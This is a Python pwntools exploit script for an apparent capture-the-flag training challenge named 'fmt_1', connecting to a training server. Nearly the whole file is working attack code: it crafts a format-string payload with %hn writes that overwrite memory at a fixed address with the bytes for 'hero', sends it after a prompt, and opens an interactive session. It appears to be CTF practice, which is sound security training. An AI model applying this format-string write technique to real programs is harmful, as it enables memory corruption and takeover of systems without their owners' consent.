#!/usr/bin/env python3
from pwn import *

PORT = 1337
HOST = "pwn-raising-the-hero-24e5615a887b.training.bksec.vn"

elf = context.binary = ELF('./fmt_1', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b*0x000000000040133D
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True, sni=HOST)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

tg = 0x00000000004034A4
p1 = 0x6568
p2 = 0x6F72

fmt = f'%{p1}c%14$hn'.encode()
fmt += f'%{p2-p1}c%15$hn'.encode()
pl = fmt.ljust(0x20, b'A')
pl += flat(
	tg, tg+2
	)

# GDB()
sa(b'to say?', pl)

p.interactive()